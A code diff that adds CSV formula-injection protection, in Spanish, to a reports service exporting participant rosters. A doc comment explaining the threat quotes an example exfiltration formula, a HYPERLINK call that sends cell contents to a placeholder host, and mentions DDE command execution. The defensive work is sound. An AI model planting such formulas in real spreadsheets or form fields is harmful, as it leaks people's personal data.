@@ -71,6 +71,67 @@ export interface EspecificacionReporte {
   lotes: () => AsyncGenerator<unknown[][], void, undefined>;
 }
 
+// ===========================================
+// Inyección de fórmulas en CSV (R15)
+// ===========================================
+
+/**
+ * Caracteres con los que Excel, LibreOffice y Google Sheets interpretan la
+ * celda como **fórmula** en vez de como texto. Se admiten espacios, tabs o
+ * saltos por delante porque las planillas los descartan antes de decidir: una
+ * celda que empieza con `" =1+1"` se evalúa igual que `"=1+1"`.
+ */
+// Los caracteres de control por delante son parte del ataque: es justo lo que
+// hay que detectar, de ahí el disable.
+// eslint-disable-next-line no-control-regex
+const INICIO_DE_FORMULA = /^[\s\u0000-\u001f]*[=+\-@]/;
+
+/**
+ * ¿El texto es lisa y llanamente un número? (`-5`, `+3.5`, `1e3`)
+ *
+ * Sin espacios por delante ni por detrás a propósito: un `"		+1"` es un
+ * número para la aritmética pero es una celda rara para una planilla, y la
+ * diferencia entre "número con basura adelante" y "fórmula con basura adelante"
+ * depende de qué programa la abra. Ante la duda, se prefija.
+ */
+const ES_NUMERO = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;
+
+/**
+ * Neutraliza la celda antes de escribirla en el CSV.
+ *
+ * El vector: un participante se anota con apellido `=1+1`, o mejor
+ * `=HYPERLINK("http://malo/?d="&A1,"Ver")`, o `@SUM(...)`. El padrón se exporta
+ * y alguien de la Secretaría lo abre con doble clic. Excel no ve un apellido:
+ * ve una fórmula y la ejecuta, con acceso a las demás celdas de la fila —el DNI
+ * del chico, el teléfono— y, con el diálogo de DDE aceptado, a ejecución de
+ * comandos. El atacante no necesita entrar a ningún sistema: le alcanza con
+ * escribir su apellido en el formulario público de inscripción.
+ *
+ * La defensa estándar es prefijar la celda con un apóstrofo, que las planillas
+ * leen como "esto es texto" y no muestran.
+ *
+ * Los números se dejan intactos: `-5` no es una fórmula y prefijarlo lo
+ * convertiría en texto, rompiendo las columnas numéricas del reporte.
+ *
+ * El .xlsx no lo necesita: `ExcelJS` escribe estos valores como celdas de tipo
+ * string y sólo evalúa lo que se le pasa explícitamente como `{ formula: ... }`.
+ * El agujero es exclusivo del CSV, donde el tipo de la celda lo decide quien
+ * abre el archivo.
+ */
+export function neutralizarFormulaCsv(celda: unknown): string {
+  // `String(celda)` y no `String(celda ?? '')`: el formato de salida tiene que
+  // seguir siendo byte a byte el de antes para todo lo que no sea una fórmula
+  // (un `null` se venía escribiendo como el texto "null", y hay un test que lo
+  // fija). Este cambio toca sólo las celdas peligrosas.
+  const texto = String(celda);
+
+  if (typeof celda === 'number' || typeof celda === 'bigint') return texto;
+  if (!INICIO_DE_FORMULA.test(texto)) return texto;
+  if (ES_NUMERO.test(texto)) return texto;
+
+  return `'${texto}`;
+}
+
 @Injectable()
 export class ReportsService {
   private readonly logger = new Logger(ReportsService.name);
@@ -243,7 +304,7 @@ export class ReportsService {
 
   private aLineaCsv(fila: unknown[]): string {
     return fila
-      .map((celda) => `"${String(celda).replace(/"/g, '""')}"`)
+      .map((celda) => `"${neutralizarFormulaCsv(celda).replace(/"/g, '""')}"`)
       .join(',');
   }
 
